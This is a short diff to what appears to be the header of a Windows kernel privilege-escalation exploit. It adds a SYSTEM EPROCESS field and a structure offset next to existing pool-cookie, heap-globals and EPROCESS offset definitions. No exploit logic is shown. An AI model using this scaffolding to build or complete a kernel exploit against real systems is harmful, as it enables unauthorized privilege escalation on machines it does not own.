@@ -6,6 +6,7 @@
 #define SYSTEM_PID 0x4
 
 // Kernel structure offsets
+#define EPROCESS_TYPE_OFFSET 0x0
 #define EPROCESS_KTHREAD_OFFSET 0x30
 #define EPROCESS_UNIQUE_PROCESS_ID_OFFSET 0x440
 #define EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET 0x448
@@ -120,6 +121,7 @@ typedef struct exploit_addresses
     uintptr_t kernel_base;
     uintptr_t ExpPoolQuotaCookie;
     uintptr_t RtlpHpHeapGlobals;
+    uintptr_t system_eprocess;
     uintptr_t self_eprocess;
     uintptr_t self_kthread;
 } exploit_addresses_t;
